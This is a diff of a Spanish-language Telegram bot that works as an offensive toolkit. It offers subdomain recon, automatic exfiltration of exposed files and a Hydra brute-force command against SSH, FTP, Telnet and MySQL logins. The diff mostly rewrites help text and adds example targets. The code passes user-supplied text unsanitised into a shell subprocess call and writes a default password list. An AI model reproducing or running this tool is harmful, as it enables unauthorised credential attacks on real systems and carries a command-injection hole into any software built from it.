@@ -71,11 +71,11 @@ def descargar_filtracion(url, chat_id):
 def send_welcome(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
         help_text = (
-            "🤖 **Bugtin Bot v8.7 - Hydra.sh Mode**\n\n"
+            "🤖 **Bugtin Bot v8.8 - Expert Mode**\n\n"
             "📡 `/subs` - Recon de subdominios.\n"
             "🔓 `/archivos` - Escaneo y exfiltración automática.\n"
-            "⚡ `/fuerza` - Ataque vía `hydra.sh`.\n\n"
-            "🚀 *Estado: Configurado para usar script local.*"
+            "⚡ `/fuerza` - Ataque Hydra con ejemplos.\n\n"
+            "🚀 *Estado: Configurado con soporte hydra.sh local.*"
         )
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
@@ -146,11 +146,22 @@ def process_vulns_step(message):
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
 
-# --- LÓGICA: FUERZA BRUTA (Hydra Clonado) ---
+# --- LÓGICA: FUERZA BRUTA (Hydra con ejemplos detallados) ---
 @bot.message_handler(commands=['fuerza'])
 def start_fuerza(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
-        msg = bot.send_message(message.chat.id, "⚔️ **Ataque Hydra**\n\nFormato: `IP Servicio Usuario` \nEj: `1.1.1.1 ssh root`", parse_mode="Markdown")
+        ejemplos = (
+            "⚔️ **Ataque de Fuerza Bruta (Hydra)**\n\n"
+            "Escribe los datos en el siguiente formato:\n"
+            "`IP/Host Servicio Usuario` \n\n"
+            "💡 **Ejemplos de uso:**\n"
+            "• SSH: `192.168.1.1 ssh root` \n"
+            "• FTP: `ftp.objetivo.com ftp admin` \n"
+            "• Telnet: `10.0.0.5 telnet user` \n"
+            "• MySQL: `sql.db.com mysql root` \n\n"
+            "🚀 *El bot utilizará automáticamente 'passwords.txt' como diccionario.*"
+        )
+        msg = bot.send_message(message.chat.id, ejemplos, parse_mode="Markdown")
         bot.register_next_step_handler(msg, process_fuerza_step)
 
 def process_fuerza_step(message):
@@ -163,7 +174,7 @@ def process_fuerza_step(message):
 
         data = message.text.split()
         if len(data) < 3:
-            bot.send_message(message.chat.id, "❌ Formato: `IP Servicio Usuario` (ej: 10.0.0.1 ftp admin)")
+            bot.send_message(message.chat.id, "❌ Formato incorrecto. Usa: `IP Servicio Usuario`.")
             return
         
         ip, servicio, user = data[0], data[1], data[2]
@@ -174,7 +185,7 @@ def process_fuerza_step(message):
         if not os.path.exists(pass_list):
             with open(pass_list, "w") as f: f.write("admin\n123456\npassword\nroot\n12345")
 
-        bot.send_message(chat_id, f"⚡ Atacando `{ip}` usando `{comando_base}`...")
+        bot.send_message(chat_id, f"⚡ Iniciando ataque contra `{ip}` mediante `{servicio}`...")
         
         # Ejecutamos el ataque
         subprocess.run(f"{comando_base} -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
@@ -197,5 +208,5 @@ def btn_arch(m): start_archivos(m)
 @bot.message_handler(func=lambda m: m.text == "⚡ Ataque de Fuerza Bruta")
 def btn_fuerza(m): start_fuerza(m)
 
-print("🚀 Bugtin Bot v8.7 Online. Usando hydra.sh para fuerza bruta.")
+print("🚀 Bugtin Bot v8.8 Online. Motor Hydra con ejemplos listo.")
 bot.polling()
